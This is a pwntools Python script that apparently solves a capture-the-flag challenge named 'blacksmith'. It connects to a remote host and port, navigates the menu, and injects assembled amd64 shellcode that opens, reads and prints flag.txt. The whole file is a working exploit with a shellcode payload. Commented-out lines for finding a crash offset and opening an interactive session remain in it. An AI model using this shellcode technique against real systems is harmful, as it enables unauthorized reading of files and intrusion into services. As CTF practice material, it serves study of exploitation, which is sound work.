import pwn
from pwn import *
context.arch = 'amd64'

#p = process('./blacksmith')
p = remote('139.59.184.216',31667) #139.59.184.216:31667

init_input = p.recvuntil('>')
print(init_input)

ip1 = b'1'
p.sendline(ip1)

fi_input = p.recvuntil('>')
print(fi_input)

ip2 = b'2'
p.sendline(ip2)

buf_input = p.recvuntil('>')
print(buf_input)

payload = asm(shellcraft.amd64.open('flag.txt'))
payload += asm(shellcraft.amd64.read(3,'rsp',0x100))
payload += asm(shellcraft.amd64.write(1,'rsp','rax'))
final_payload = flat(payload)
p.sendline(final_payload)


final_op = p.recvuntil('}')
print(final_op)

#core = Coredump('./core')
#print(cyclic_find(core.read(core.rsp, 8), n=8))

#p.interactive()